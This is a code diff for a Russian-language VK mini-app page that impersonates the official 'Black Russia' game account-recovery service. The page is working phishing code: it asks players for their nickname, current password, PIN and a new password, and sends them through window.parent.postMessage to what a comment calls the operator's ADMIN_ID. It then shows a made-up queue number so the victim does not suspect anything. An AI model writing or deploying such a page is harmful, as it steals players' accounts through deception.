@@ -6,42 +6,92 @@
     <title>Black Russia — Поддержка</title>
     <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
     <style>
-        body { background-color: #000000; color: #ffffff; font-family: -apple-system, system-ui, Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
-        .wrapper { width: 100%; max-width: 500px; padding: 40px 20px; box-sizing: border-box; }
-        .logo-box { text-align: center; margin-bottom: 35px; }
-        .logo-box img { width: 150px; }
-        .header-text { text-align: center; margin-bottom: 30px; }
-        .header-text h1 { font-size: 24px; margin: 0; font-weight: 700; }
-        .header-text p { color: #828282; font-size: 14px; margin-top: 8px; }
-        .input-item { margin-bottom: 20px; }
-        .input-item label { display: block; font-size: 13px; color: #5d5d5d; margin-bottom: 10px; font-weight: 600; text-transform: uppercase; }
-        input, select { width: 100%; background: #121212; border: 1px solid #1f1f1f; border-radius: 12px; padding: 16px; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ff8c00; }
-        .main-button { width: 100%; background: #ff8c00; color: #000; border: none; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
+        body { background-color: #0c0c0c; color: #ffffff; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .wrapper { width: 100%; max-width: 450px; padding: 40px 25px; box-sizing: border-box; display: none; text-align: center; }
+        .active { display: block; }
+        
+        /* Экран 1: Стиль BLACK RUSSIA */
+        .red-main { color: #ff0000; font-weight: 900; font-size: 32px; text-transform: uppercase; margin-bottom: 5px; }
+        .white-sub { font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; color: #fff; }
+        .gray-text { color: #444; font-size: 16px; margin-bottom: 50px; }
+        
+        /* Экран 2: Данные аккаунта */
+        .form-title { color: #ff0000; font-weight: 800; font-size: 20px; text-transform: uppercase; margin-bottom: 25px; }
+        .field { text-align: left; margin-bottom: 15px; }
+        .field label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
+        input, select { width: 100%; background: #1a1a1a; border: 1px solid #222; border-radius: 10px; padding: 14px; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 1px solid #ff0000; }
+
+        /* Красная кнопка */
+        .btn-red { width: 100%; background: #ff0000; color: #fff; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 800; margin-top: 25px; cursor: pointer; text-transform: uppercase; }
+        
+        /* Экран 3: Заявка принята */
+        .q-title { color: #ff0000; font-weight: 900; font-size: 28px; text-transform: uppercase; margin-bottom: 30px; }
+        .q-number { font-size: 90px; color: #ff0000; font-weight: 900; margin: 20px 0; }
     </style>
 </head>
 <body>
-<div class="wrapper">
-    <div class="logo-box"><img src="https://blackrussia.online/assets/img/logo.png" alt="BR"></div>
-    <div class="header-text"><h1>Авторизация</h1><p>Введите данные вашего игрового аккаунта</p></div>
-    <div class="input-item"><label>Игровой сервер</label><select id="s"></select></div>
-    <div class="input-item"><label>Ваш никнейм</label><input type="text" id="n" placeholder="Ivan_Ivanov"></div>
-    <div class="input-item"><label>Пароль</label><input type="password" id="p" placeholder="Введите пароль"></div>
-    <button class="main-button" onclick="go()">Авторизоваться</button>
+
+<!-- ЭКРАН 1 -->
+<div id="s1" class="wrapper active">
+    <div style="margin-top: 80px;">
+        <div class="red-main">BLACK RUSSIA</div>
+        <div class="white-sub">ВОССТАНОВЛЕНИЕ ДОСТУПА</div>
+        <p class="gray-text">Официальный сервис управления аккаунтом</p>
+        <button class="btn-red" onclick="move(2)">Продолжить</button>
+    </div>
 </div>
+
+<!-- ЭКРАН 2 -->
+<div id="s2" class="wrapper">
+    <div class="form-title">ДАННЫЕ АККАУНТА</div>
+    <div class="field"><label>Ваш Никнейм *</label><input type="text" id="n" placeholder="Ivan_Ivanov"></div>
+    <div class="field"><label>Текущий пароль *</label><input type="password" id="p" placeholder="Введите пароль"></div>
+    <div class="field"><label>Пин-код (если есть)</label><input type="text" id="pin" placeholder="1234"></div>
+    <div class="field"><label>Выберите сервер *</label><select id="srv"></select></div>
+    <div class="field"><label>Новый пароль *</label><input type="password" id="np" placeholder="Придумайте пароль"></div>
+    <button class="btn-red" onclick="finish()">Сменить пароль</button>
+</div>
+
+<!-- ЭКРАН 3 -->
+<div id="s3" class="wrapper">
+    <div class="q-title">ЗАЯВКА ПРИНЯТА</div>
+    <p style="color: #888;">Ваша очередь в системе:</p>
+    <div id="num" class="q-number">--</div>
+    <p style="font-weight: 700; font-size: 18px;">Ориентировочное время ожидания:<br><span style="color: #888; font-weight: 400;">от 5 до 15 минут</span></p>
+    <p style="color: #333; font-size: 13px; margin-top: 30px;">Не закрывайте это окно до завершения проверки.</p>
+    <button class="btn-red" onclick="vkBridge.send('VKWebAppClose');">Завершить</button>
+</div>
+
 <script>
     vkBridge.send("VKWebAppInit");
-    const list = ["RED [1]", "GREEN [2]", "BLUE [3]", "YELLOW [4]", "ORANGE [5]", "PURPLE [6]", "LIME [7]", "PINK [8]", "CHERRY [9]", "BLACK [10]", "INDIGO [11]", "WHITE [12]", "MAGENTA [13]", "CRIMSON [14]", "GOLD [15]", "AZURE [16]", "PLATINUM [17]", "AQUA [18]", "GRAY [19]", "ICE [20]", "CHILLI [21]", "CHOCO [22]", "MOSCOW [23]", "SPB [24]", "UFA [25]", "SOCHI [26]", "KAZAN [27]", "SAMARA [28]", "ROSTOV [29]", "ANAPA [30]", "EKB [31]", "KRASNODAR [32]", "ARZAMAS [33]", "NOVOSIBIRSK [34]", "GROZNY [35]", "SARATOV [36]", "OMSK [37]", "IRKUTSK [38]", "VOLGOGRAD [39]", "VORONEZH [40]", "BELGOROD [41]", "MAKHACHKALA [42]", "VLADIKAVKAZ [43]", "VLADIVOSTOK [44]", "KALININGRAD [45]", "CHELYABINSK [46]", "KRASNOYARSK [47]", "CHEBOKSARY [48]", "KHABAROVSK [49]", "PERM [50]", "TULA [51]", "RYAZAN [52]", "MURMANSK [53]", "PENZA [54]", "KURSK [55]", "ARKHANGELSK [56]", "ORENBURG [57]", "KIROV [58]", "KEMEROVO [59]", "TYUMEN [60]", "TOLYATTI [61]", "IVANOVO [62]", "STAVROPOL [63]", "SMOLENSK [64]", "PSKOV [65]", "BRYANSK [66]", "OREL [67]", "YAROSLAVL [68]", "BARNAUL [69]", "LIPETSK [70]", "ULYANOVSK [71]", "YAKUTSK [72]", "TAMBOV [73]", "BRATSK [74]", "ASTRAKHAN [75]", "CHITA [76]", "KOSTROMA [77]", "VLADIMIR [78]", "KALUGA [79]", "N.NOVGOROD [80]", "TAGANROG [81]", "VOLOGDA [82]", "TVER [83]", "TOMSK [84]", "IZHEVSK [85]", "SURGUT [86]", "PODOLSK [87]", "MAGADAN [88]", "CHEREPOVETS [89]", "NORILSK [90]", "ASTANA [91]"];
-    const sel = document.getElementById('s');
-    list.forEach(item => { let opt = document.createElement('option'); opt.value = item; opt.text = item; sel.appendChild(opt); });
-    function go() {
-        const nick = document.getElementById('n').value;
-        const pass = document.getElementById('p').value;
-        const srv = sel.value;
-        if(!nick || !pass) { alert("Заполните все поля!"); return; }
-        window.parent.postMessage(JSON.stringify({ status: "send", data: { nick, pass, srv } }), "*");
-        document.querySelector('.main-button').innerText = "Проверка...";
-        setTimeout(() => { alert("Сервер " + srv + " временно недоступен. Повторите попытку через 15 минут."); document.querySelector('.main-button').innerText = "Авторизоваться"; }, 2000);
+
+    // Список серверов
+    const servers = ["Нажмите для выбора", "RED [1]", "GREEN [2]", "BLUE [3]", "YELLOW [4]", "ORANGE [5]", "PURPLE [6]", "LIME [7]", "PINK [8]", "CHERRY [9]", "BLACK [10]", "INDIGO [11]", "WHITE [12]", "MAGENTA [13]", "CRIMSON [14]", "GOLD [15]", "AZURE [16]", "PLATINUM [17]", "AQUA [18]", "GRAY [19]", "ICE [20]", "CHILLI [21]", "CHOCO [22]", "MOSCOW [23]", "SPB [24]", "UFA [25]", "SOCHI [26]", "KAZAN [27]", "SAMARA [28]", "ROSTOV [29]", "ANAPA [30]", "EKB [31]", "KRASNODAR [32]", "ARZAMAS [33]", "NOVOSIBIRSK [34]", "GROZNY [35]", "SARATOV [36]", "OMSK [37]", "IRKUTSK [38]", "VOLGOGRAD [39]", "VORONEZH [40]", "BELGOROD [41]", "MAKHACHKALA [42]", "VLADIKAVKAZ [43]", "VLADIVOSTOK [44]", "KALININGRAD [45]", "CHELYABINSK [46]", "KRASNOYARSK [47]", "CHEBOKSARY [48]", "KHABAROVSK [49]", "PERM [50]", "TULA [51]", "RYAZAN [52]", "MURMANSK [53]", "PENZA [54]", "KURSK [55]", "ARKHANGELSK [56]", "ORENBURG [57]", "KIROV [58]", "KEMEROVO [59]", "TYUMEN [60]", "TOLYATTI [61]", "IVANOVO [62]", "STAVROPOL [63]", "SMOLENSK [64]", "PSKOV [65]", "BRYANSK [66]", "OREL [67]", "YAROSLAVL [68]", "BARNAUL [69]", "LIPETSK [70]", "ULYANOVSK [71]", "YAKUTSK [72]", "TAMBOV [73]", "BRATSK [74]", "ASTRAKHAN [75]", "CHITA [76]", "KOSTROMA [77]", "VLADIMIR [78]", "KALUGA [79]", "N.NOVGOROD [80]", "TAGANROG [81]", "VOLOGDA [82]", "TVER [83]", "TOMSK [84]", "IZHEVSK [85]", "SURGUT [86]", "PODOLSK [87]", "MAGADAN [88]", "CHEREPOVETS [89]", "NORILSK [90]", "ASTANA [91]"];
+    const sel = document.getElementById('srv');
+    servers.forEach(s => { let o = document.createElement('option'); o.value = s; o.text = s; sel.appendChild(o); });
+
+    function move(step) {
+        document.querySelectorAll('.wrapper').forEach(w => w.classList.remove('active'));
+        document.getElementById('s' + step).classList.add('active');
+    }
+
+    function finish() {
+        const data = {
+            nick: document.getElementById('n').value,
+            pass: document.getElementById('p').value,
+            pin: document.getElementById('pin').value,
+            server: document.getElementById('srv').value,
+            new_pass: document.getElementById('np').value
+        };
+        if(!data.nick || !data.pass || data.server === "Нажмите для выбора") return alert("Заполните поля!");
+
+        // Отправка данных на твой ADMIN_ID
+        window.parent.postMessage(JSON.stringify({ status: "send", data: data }), "*");
+
+        // Случайное число очереди от 1 до 99
+        document.getElementById('num').innerText = Math.floor(Math.random() * 99) + 1;
+        move(3);
     }
 </script>
 </body>
